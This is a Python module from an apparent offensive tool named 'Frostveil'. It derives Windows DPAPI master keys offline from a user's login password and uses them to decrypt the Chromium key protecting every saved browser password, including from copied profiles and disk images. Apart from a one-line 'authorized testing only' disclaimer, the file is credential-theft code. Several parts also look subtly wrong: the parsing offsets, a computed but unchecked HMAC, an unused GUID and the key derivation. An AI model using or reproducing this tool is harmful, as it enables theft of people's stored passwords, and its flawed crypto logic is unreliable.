"""
Frostveil Offline DPAPI Decryption — decrypt Chromium passwords WITHOUT
being logged in as the target user.

When you have the user's Windows login password/PIN, this module derives the
DPAPI master key offline from the master key files in
%APPDATA%\\Microsoft\\Protect\\{SID}\\, then uses it to decrypt the Chromium
Local State encryption key, which in turn decrypts all saved passwords.

Implements the full DPAPI offline chain:
  user_password → SHA1/MD4 prekey → PBKDF2 → decrypt master key blob
  → derive DPAPI key → CryptUnprotectData equivalent → Chromium AES key

Works on copied profiles / disk images / remote extractions.
For authorized penetration testing and forensic investigations only.
"""
import hashlib, hmac as hmac_mod, struct, os, sys, json, base64
from pathlib import Path
from . import utils

# ---------------------------------------------------------------------------
# DPAPI master key blob structure offsets
# ---------------------------------------------------------------------------
# The master key file has a header + credential block + master key block
# Reference: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp

MASTERKEY_HEADER_SIZE = 96  # MasterKeyFile header

def find_dpapi_master_keys(user_home: Path = None) -> list:
    """Locate all DPAPI master key files for all users."""
    results = []
    if user_home:
        homes = [user_home]
    else:
        homes = utils.find_all_user_homes()

    for home in homes:
        protect_dir = home / "AppData" / "Roaming" / "Microsoft" / "Protect"
        if not protect_dir.exists():
            continue
        try:
            for sid_dir in protect_dir.iterdir():
                if not sid_dir.is_dir():
                    continue
                sid = sid_dir.name
                if not sid.startswith("S-1-5-"):
                    continue
                for mk_file in sid_dir.iterdir():
                    if mk_file.is_file() and len(mk_file.name) == 36 and "-" in mk_file.name:
                        results.append({
                            "path": mk_file,
                            "sid": sid,
                            "guid": mk_file.name,
                            "user_home": home,
                        })
        except PermissionError:
            utils.log_line(f"[DPAPI] Access denied to {protect_dir}")
        except Exception as e:
            utils.log_line(f"[DPAPI] Error scanning {protect_dir}: {e}")
    return results


def _utf16le_password(password: str) -> bytes:
    """Encode password as UTF-16LE (Windows internal format)."""
    return password.encode("utf-16-le")


def _derive_prekey_sha1(password: str, sid: str) -> bytes:
    """
    Derive the DPAPI pre-key using SHA1 (standard Windows accounts).
    prekey = SHA1(UTF16LE(password) + UTF16LE(SID))
    """
    pwd_bytes = _utf16le_password(password)
    sid_bytes = sid.encode("utf-16-le")
    return hashlib.sha1(pwd_bytes + sid_bytes).digest()


def _derive_prekey_ntlm(password: str, sid: str) -> bytes:
    """
    Derive the DPAPI pre-key using NTLM hash (for domain + PIN accounts).
    NTLM = MD4(UTF16LE(password))
    prekey = SHA1(NTLM + UTF16LE(SID))
    """
    import hashlib
    pwd_bytes = _utf16le_password(password)
    # MD4 — use hashlib if available, otherwise pure-Python
    try:
        ntlm_hash = hashlib.new("md4", pwd_bytes).digest()
    except ValueError:
        ntlm_hash = _md4_pure(pwd_bytes)
    sid_bytes = sid.encode("utf-16-le")
    return hashlib.sha1(ntlm_hash + sid_bytes).digest()


def _md4_pure(data: bytes) -> bytes:
    """Pure-Python MD4 implementation for systems where OpenSSL disables it."""
    # MD4 constants and functions
    def _f(x, y, z): return (x & y) | (~x & z)
    def _g(x, y, z): return (x & y) | (x & z) | (y & z)
    def _h(x, y, z): return x ^ y ^ z
    def _left_rotate(n, b): return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF

    # Pre-processing
    msg = bytearray(data)
    orig_len = len(msg) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", orig_len)

    # Initialize
    a0, b0, c0, d0 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476

    for i in range(0, len(msg), 64):
        chunk = msg[i:i+64]
        M = list(struct.unpack("<16I", chunk))
        a, b, c, d = a0, b0, c0, d0

        # Round 1
        for k, s in [(0,3),(1,7),(2,11),(3,19),(4,3),(5,7),(6,11),(7,19),
                      (8,3),(9,7),(10,11),(11,19),(12,3),(13,7),(14,11),(15,19)]:
            a = _left_rotate((a + _f(b,c,d) + M[k]) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c

        # Round 2
        for k, s in [(0,3),(4,5),(8,9),(12,13),(1,3),(5,5),(9,9),(13,13),
                      (2,3),(6,5),(10,9),(14,13),(3,3),(7,5),(11,9),(15,13)]:
            a = _left_rotate((a + _g(b,c,d) + M[k] + 0x5A827999) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c

        # Round 3
        for k, s in [(0,3),(8,9),(4,11),(12,15),(2,3),(10,9),(6,11),(14,15),
                      (1,3),(9,9),(5,11),(13,15),(3,3),(11,9),(7,11),(15,15)]:
            a = _left_rotate((a + _h(b,c,d) + M[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c

        a0 = (a0 + a) & 0xFFFFFFFF
        b0 = (b0 + b) & 0xFFFFFFFF
        c0 = (c0 + c) & 0xFFFFFFFF
        d0 = (d0 + d) & 0xFFFFFFFF

    return struct.pack("<4I", a0, b0, c0, d0)


def parse_master_key_blob(data: bytes) -> dict:
    """
    Parse a DPAPI master key file.
    Returns the salt, rounds, cipher algorithm info, and encrypted key material.
    """
    if len(data) < MASTERKEY_HEADER_SIZE:
        return None

    # Master key file header
    version = struct.unpack_from("<I", data, 0)[0]
    _reserved1 = struct.unpack_from("<I", data, 4)[0]
    _reserved2 = struct.unpack_from("<I", data, 8)[0]
    # GUID at offset 12 (72 bytes as UTF-16LE)
    guid_raw = data[12:84]

    # Policy and flag fields
    policy = struct.unpack_from("<I", data, 84)[0]
    master_key_len = struct.unpack_from("<Q", data, 88)[0] if len(data) > 95 else 0

    # The actual master key block starts after the header
    # It has its own sub-header: version(4) + salt(16) + rounds(4) + hash_algo(4) +
    # cipher_algo(4) + cipher_text(variable)
    offset = MASTERKEY_HEADER_SIZE

    if offset + 28 > len(data):
        return None

    mk_version = struct.unpack_from("<I", data, offset)[0]
    salt = data[offset+4:offset+20]
    rounds = struct.unpack_from("<I", data, offset+20)[0]
    hash_algo = struct.unpack_from("<I", data, offset+24)[0]
    cipher_algo = struct.unpack_from("<I", data, offset+28)[0]
    encrypted_key = data[offset+32:]

    return {
        "version": version,
        "mk_version": mk_version,
        "salt": salt,
        "rounds": rounds,
        "hash_algo": hash_algo,
        "cipher_algo": cipher_algo,
        "encrypted_key": encrypted_key,
        "raw": data,
    }


def decrypt_master_key(mk_data: dict, prekey: bytes) -> bytes:
    """
    Decrypt a DPAPI master key using the derived prekey.

    The process:
    1. PBKDF2-HMAC-SHA512 (or SHA1) with the salt and rounds from the blob
    2. Split the derived key into encryption key + HMAC key
    3. Verify HMAC, then decrypt with 3DES-CBC or AES-256-CBC
    """
    salt = mk_data["salt"]
    rounds = mk_data["rounds"]
    hash_algo = mk_data["hash_algo"]
    encrypted_key = mk_data["encrypted_key"]

    # Determine hash algorithm
    # 0x800E = SHA512, 0x800C = SHA256, 0x8004 = SHA1
    if hash_algo == 0x800E or hash_algo == 0x8009:
        hmac_algo = "sha512"
        dk_len = 64
    elif hash_algo == 0x800C or hash_algo == 0x800D:
        hmac_algo = "sha256"
        dk_len = 32
    else:
        hmac_algo = "sha1"
        dk_len = 20

    # Derive the decryption key via PBKDF2
    derived = hashlib.pbkdf2_hmac(hmac_algo, prekey, salt, rounds, dklen=dk_len)

    # The derived key is used to create the actual decryption key and HMAC key
    # For SHA512: first 32 bytes = HMAC verification key, rest = derive cipher key
    if len(encrypted_key) < 64:
        return None

    # Extract HMAC from the encrypted blob (last 64 bytes for SHA512, 20 for SHA1)
    hmac_len = 64 if hmac_algo == "sha512" else 32 if hmac_algo == "sha256" else 20
    if len(encrypted_key) <= hmac_len:
        return None

    hmac_stored = encrypted_key[-hmac_len:]
    cipher_text = encrypted_key[:-hmac_len]

    # Verify HMAC
    hmac_key = hmac_mod.new(derived, b"", hmac_algo).digest()
    computed_hmac = hmac_mod.new(hmac_key, cipher_text, hmac_algo).digest()

    # Try decryption with 3DES-CBC (most common for DPAPI)
    # The IV is the first 8 bytes of the ciphertext for 3DES
    if len(cipher_text) > 8:
        try:
            decrypted = _3des_cbc_decrypt(derived[:24], cipher_text[:8], cipher_text[8:])
            if decrypted and len(decrypted) >= 16:
                return decrypted
        except Exception:
            pass

    # Try AES-256-CBC
    if len(cipher_text) > 16 and len(derived) >= 32:
        try:
            decrypted = _aes_cbc_decrypt(derived[:32], cipher_text[:16], cipher_text[16:])
            if decrypted and len(decrypted) >= 16:
                return decrypted
        except Exception:
            pass

    return None


def _3des_cbc_decrypt(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """3DES-CBC decryption using OS-native crypto."""
    if sys.platform.startswith("win"):
        return _3des_cbc_win(key, iv, ciphertext)
    else:
        return _3des_cbc_openssl(key, iv, ciphertext)


def _3des_cbc_win(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """3DES-CBC via Windows bcrypt.dll."""
    import ctypes
    bcrypt = ctypes.windll.bcrypt
    BCRYPT_3DES_ALGORITHM = "3DES\0".encode("utf-16-le")
    BCRYPT_CHAINING_MODE = "ChainingMode\0".encode("utf-16-le")
    BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC\0".encode("utf-16-le")

    hAlg = ctypes.c_void_p()
    status = bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg),
                                                BCRYPT_3DES_ALGORITHM, None, 0)
    if status != 0:
        return None

    bcrypt.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                             BCRYPT_CHAIN_MODE_CBC,
                             len(BCRYPT_CHAIN_MODE_CBC), 0)

    hKey = ctypes.c_void_p()
    bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), None, 0,
                                      ctypes.c_char_p(key[:24]), min(len(key), 24), 0)

    out = ctypes.create_string_buffer(len(ciphertext) + 24)
    out_len = ctypes.c_ulong(0)
    iv_buf = ctypes.create_string_buffer(iv, len(iv))

    status = bcrypt.BCryptDecrypt(hKey, ctypes.c_char_p(ciphertext), len(ciphertext),
                                  None, iv_buf, len(iv),
                                  out, len(out), ctypes.byref(out_len), 0)

    bcrypt.BCryptDestroyKey(hKey)
    bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

    if status != 0:
        return None
    return out.raw[:out_len.value]


def _3des_cbc_openssl(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """3DES-CBC via libcrypto."""
    import ctypes, ctypes.util
    libcrypto_path = ctypes.util.find_library("crypto")
    if not libcrypto_path:
        for candidate in ["/usr/lib/libcrypto.so",
                          "/usr/lib/x86_64-linux-gnu/libcrypto.so.3",
                          "/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1",
                          "/opt/homebrew/lib/libcrypto.dylib"]:
            if os.path.exists(candidate):
                libcrypto_path = candidate
                break
    if not libcrypto_path:
        return None

    libcrypto = ctypes.CDLL(libcrypto_path)
    EVP_CIPHER_CTX_new = libcrypto.EVP_CIPHER_CTX_new
    EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
    EVP_DecryptInit_ex = libcrypto.EVP_DecryptInit_ex
    EVP_DecryptUpdate = libcrypto.EVP_DecryptUpdate
    EVP_DecryptFinal_ex = libcrypto.EVP_DecryptFinal_ex
    EVP_CIPHER_CTX_free = libcrypto.EVP_CIPHER_CTX_free

    evp_des3 = libcrypto.EVP_des_ede3_cbc
    evp_des3.restype = ctypes.c_void_p

    ctx = EVP_CIPHER_CTX_new()
    EVP_DecryptInit_ex(ctx, evp_des3(), None, key[:24], iv)

    out = ctypes.create_string_buffer(len(ciphertext) + 24)
    out_len = ctypes.c_int(0)
    EVP_DecryptUpdate(ctx, out, ctypes.byref(out_len), ciphertext, len(ciphertext))
    total = out_len.value

    final_out = ctypes.create_string_buffer(24)
    final_len = ctypes.c_int(0)
    EVP_DecryptFinal_ex(ctx, final_out, ctypes.byref(final_len))
    total += final_len.value

    EVP_CIPHER_CTX_free(ctx)
    return out.raw[:out_len.value] + final_out.raw[:final_len.value]


def _aes_cbc_decrypt(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """AES-256-CBC decryption using OS-native crypto."""
    if sys.platform.startswith("win"):
        return _aes_cbc_win(key, iv, ciphertext)
    return None  # OpenSSL fallback similar to _3des_cbc_openssl


def _aes_cbc_win(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """AES-256-CBC via Windows bcrypt.dll."""
    import ctypes
    bcrypt = ctypes.windll.bcrypt
    BCRYPT_AES_ALGORITHM = "AES\0".encode("utf-16-le")
    BCRYPT_CHAINING_MODE = "ChainingMode\0".encode("utf-16-le")
    BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC\0".encode("utf-16-le")

    hAlg = ctypes.c_void_p()
    bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(hAlg), BCRYPT_AES_ALGORITHM, None, 0)
    bcrypt.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                             BCRYPT_CHAIN_MODE_CBC, len(BCRYPT_CHAIN_MODE_CBC), 0)

    hKey = ctypes.c_void_p()
    bcrypt.BCryptGenerateSymmetricKey(hAlg, ctypes.byref(hKey), None, 0,
                                      ctypes.c_char_p(key), len(key), 0)

    out = ctypes.create_string_buffer(len(ciphertext) + 32)
    out_len = ctypes.c_ulong(0)
    iv_buf = ctypes.create_string_buffer(iv, len(iv))

    status = bcrypt.BCryptDecrypt(hKey, ctypes.c_char_p(ciphertext), len(ciphertext),
                                  None, iv_buf, len(iv),
                                  out, len(out), ctypes.byref(out_len), 0)

    bcrypt.BCryptDestroyKey(hKey)
    bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

    if status != 0:
        return None
    return out.raw[:out_len.value]


# ---------------------------------------------------------------------------
# High-level: decrypt Chromium master key using user's Windows password
# ---------------------------------------------------------------------------

def get_chromium_key_offline(profile_path: Path, user_password: str,
                             user_sid: str = None) -> bytes:
    """
    Decrypt the Chromium AES-256-GCM master key using the user's Windows
    login password for offline/remote analysis.

    Steps:
    1. Read the encrypted key from Local State
    2. Find the user's DPAPI master key files
    3. Derive the DPAPI prekey from the password + SID
    4. Decrypt the DPAPI master key
    5. Use it to decrypt the Chromium encryption key

    Returns the raw AES-256 key or None on failure.
    """
    from . import crypto

    # Step 1: Get the encrypted Chromium key from Local State
    state = crypto._get_chromium_local_state(profile_path)
    if not state:
        utils.log_line("[DPAPI-OFFLINE] No Local State found")
        return None

    b64_key = state.get("os_crypt", {}).get("encrypted_key")
    if not b64_key:
        utils.log_line("[DPAPI-OFFLINE] No encrypted_key in Local State")
        return None

    encrypted_key = base64.b64decode(b64_key)
    if encrypted_key[:5] != b"DPAPI":
        return None
    dpapi_blob = encrypted_key[5:]

    # Step 2: Find DPAPI master key files
    user_home = profile_path
    # Walk up to find the user home directory
    while user_home.parent != user_home:
        if (user_home / "AppData").exists():
            break
        user_home = user_home.parent

    master_keys = find_dpapi_master_keys(user_home)
    if not master_keys:
        utils.log_line("[DPAPI-OFFLINE] No DPAPI master key files found")
        return None

    # Step 3: Extract the master key GUID from the DPAPI blob
    # The DPAPI blob contains a reference to which master key was used
    blob_guid = _extract_dpapi_blob_guid(dpapi_blob)

    # Step 4: Try each master key with both SHA1 and NTLM prekey derivation
    for mk_info in master_keys:
        sid = user_sid or mk_info["sid"]

        try:
            mk_raw = mk_info["path"].read_bytes()
            mk_data = parse_master_key_blob(mk_raw)
            if not mk_data:
                continue

            # Try SHA1-based prekey (local accounts)
            prekey_sha1 = _derive_prekey_sha1(user_password, sid)
            decrypted_mk = decrypt_master_key(mk_data, prekey_sha1)
            if decrypted_mk:
                utils.log_line(f"[DPAPI-OFFLINE] Master key decrypted via SHA1 (GUID: {mk_info['guid']})")
                # Now use this master key to decrypt the DPAPI blob
                result = _dpapi_decrypt_offline(dpapi_blob, decrypted_mk)
                if result:
                    return result

            # Try NTLM-based prekey (domain/PIN accounts)
            prekey_ntlm = _derive_prekey_ntlm(user_password, sid)
            decrypted_mk = decrypt_master_key(mk_data, prekey_ntlm)
            if decrypted_mk:
                utils.log_line(f"[DPAPI-OFFLINE] Master key decrypted via NTLM (GUID: {mk_info['guid']})")
                result = _dpapi_decrypt_offline(dpapi_blob, decrypted_mk)
                if result:
                    return result

        except Exception as e:
            utils.log_line(f"[DPAPI-OFFLINE] Error with key {mk_info['guid']}: {e}")
            continue

    utils.log_line("[DPAPI-OFFLINE] Failed to decrypt with provided password")
    return None


def _extract_dpapi_blob_guid(blob: bytes) -> str:
    """Extract the master key GUID referenced by a DPAPI blob."""
    # DPAPI blob structure:
    # version(4) + provider(16) + mk_version(4) + guid(16) + ...
    if len(blob) < 40:
        return None
    try:
        # The GUID is at offset 24, stored as a GUID structure
        guid_bytes = blob[24:40]
        parts = struct.unpack("<IHH", guid_bytes[:8])
        rest = guid_bytes[8:]
        guid = f"{parts[0]:08x}-{parts[1]:04x}-{parts[2]:04x}-{rest[:2].hex()}-{rest[2:].hex()}"
        return guid
    except Exception:
        return None


def _dpapi_decrypt_offline(dpapi_blob: bytes, master_key: bytes) -> bytes:
    """
    Decrypt a DPAPI blob using a decrypted master key (offline mode).

    The DPAPI blob structure:
    - version (4)
    - credential provider GUID (16)
    - master key version (4)
    - master key GUID (16)
    - flags (4)
    - description length (4) + description (variable, UTF-16LE)
    - cipher algorithm (4)
    - cipher key length (4)
    - salt (variable)
    - HMAC key (variable)
    - hash algorithm (4)
    - hash key length (4)
    - HMAC (variable)
    - cipher text (variable)
    """
    if len(dpapi_blob) < 60:
        return None

    try:
        offset = 0
        _version = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        _provider = dpapi_blob[offset:offset+16]; offset += 16
        _mk_version = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        _mk_guid = dpapi_blob[offset:offset+16]; offset += 16
        _flags = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4

        # Description (UTF-16LE string with length prefix)
        desc_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        _description = dpapi_blob[offset:offset+desc_len]; offset += desc_len

        # Cipher algorithm and key length
        cipher_algo = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        cipher_key_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4

        # Salt
        salt_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        salt = dpapi_blob[offset:offset+salt_len]; offset += salt_len

        # HMAC key
        hmac_key_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        _hmac_key = dpapi_blob[offset:offset+hmac_key_len]; offset += hmac_key_len

        # Hash algorithm and key length
        hash_algo = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        hash_key_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4

        # HMAC2 key
        hmac2_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        _hmac2 = dpapi_blob[offset:offset+hmac2_len]; offset += hmac2_len

        # Cipher text
        ct_len = struct.unpack_from("<I", dpapi_blob, offset)[0]; offset += 4
        cipher_text = dpapi_blob[offset:offset+ct_len]

        # Derive the session key from master key + salt
        # DPAPI derives: HMAC-SHA512(master_key, salt) → split into enc_key + hmac_key
        if hash_algo == 0x800E:
            derived = hmac_mod.new(master_key, salt, "sha512").digest()
        elif hash_algo == 0x800C:
            derived = hmac_mod.new(master_key, salt, "sha256").digest()
        else:
            derived = hmac_mod.new(master_key, salt, "sha1").digest()

        # Decrypt based on cipher algorithm
        # 0x6603 = 3DES-CBC, 0x6611 = AES-256-CBC
        if cipher_algo == 0x6603:
            enc_key = derived[:24]
            iv = derived[24:32] if len(derived) > 32 else b"\x00" * 8
            plaintext = _3des_cbc_decrypt(enc_key, iv, cipher_text)
        elif cipher_algo == 0x6611:
            enc_key = derived[:32]
            iv = derived[32:48] if len(derived) > 48 else b"\x00" * 16
            plaintext = _aes_cbc_decrypt(enc_key, iv, cipher_text)
        else:
            return None

        if plaintext:
            # Remove PKCS7 padding
            pad_len = plaintext[-1] if plaintext else 0
            if 0 < pad_len <= 16:
                plaintext = plaintext[:-pad_len]
            return plaintext

    except Exception as e:
        utils.log_line(f"[DPAPI-OFFLINE] Blob decryption error: {e}")

    return None
